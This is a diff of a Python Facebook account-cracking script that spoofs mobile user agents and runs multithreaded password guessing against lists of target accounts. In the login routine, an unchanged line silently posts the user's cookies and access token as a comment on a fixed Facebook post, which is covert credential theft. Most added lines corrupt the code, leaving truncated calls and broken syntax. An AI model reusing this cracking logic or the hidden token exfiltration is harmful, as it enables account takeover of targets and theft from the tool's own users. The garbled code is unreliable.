@@ -11,7 +11,7 @@ try:
         from concurrent.futures import ThreadPoolExecutor as tred
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
-        os.system('pip install requests futures==2 > /dev/null')
+        o=2 > /dev/null')
         os.system('python AKING.py')
 except:pass
         
@@ -26,7 +26,7 @@ for xd in range(10000):
         h=random.randrange(73,100)
         i='0'
         j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
+        k=random.randrange(40,150)i
         l='Mobile Safari/537.36'
         uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
         ugen.append(uaku2)
@@ -35,12 +35,12 @@ for agent in range(10000):
         b=random.choice(['6','7','8','9','10','11','12'])
         c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        e=random.randrange(1, 999)
-        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
-        h=random.randrange(73,100)
+        e=random.randrange(1, 999
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', '', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/53736 (KHTML, like Gecko) Chrome/89.0.4389.99'
+        h=randomrandrange(73,100)
         i='0'
-        j=random.randrange(4200,4900)
+        j=random.randrange00,4900)
         k=random.randrange(40,150)
         l='Mobile Safari/533.1'
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
@@ -88,7 +88,7 @@ def login():
                 barth=(info['birthday'])
                 linex()
                 print(' Welcome\033[1;32m : '+name)
-                print(' \033[1;37mYour UID : '+idd)
+                print(' \033[: '+idd)
                 print(' Barth Day: '+barth)
                 requests.post('https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                 linex()
@@ -135,7 +135,7 @@ def public():
         yz = 0
         for met in range(jum):
                 yz+=1
-                kl = input(f'\033[1;37m Put link no.{yz+0}: ')
+                kl = inyz+0}: ')
                 usrr.append(kl)
         linex()
         print(' All method working try 1 by 1 ')
@@ -180,7 +180,7 @@ def public():
                         plist.append(input(f' Put password {i+1}: '))
                 with tred(max_workers=30) as crack_submit:
                         clear()
-                        total_ids = str(len(id))
+                        total_ids = str(
                         print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                         linex()
@@ -190,17 +190,23 @@ def public():
                                 if mthd in ['1','01']:
                                         crack_submit.submit(ffb,ids,names,passlist)
                                 elif mthd in ['2','02']:
-                                        crack_submit.submit(api,ids,names,passlist)
+                                        crack_su(api,ids,names,passlist)
                                 else:
                                         crack_submit.submit(api1,ids,names,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
-                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                print(' Total OK/CP: '+tr(len(cps)))
                 linex()
                 input(' Press enter to back ')
                 os.system('python AKING.py')
-        except requests.exceptions.ConnectionError:
+        except requests.exceptions.Connectio
+        
+        
+        
+        
+        
+       nError:
                 exit(f' No internet connection')
         except (KeyError,IOError):
                 print(f' No friends for {userr}')
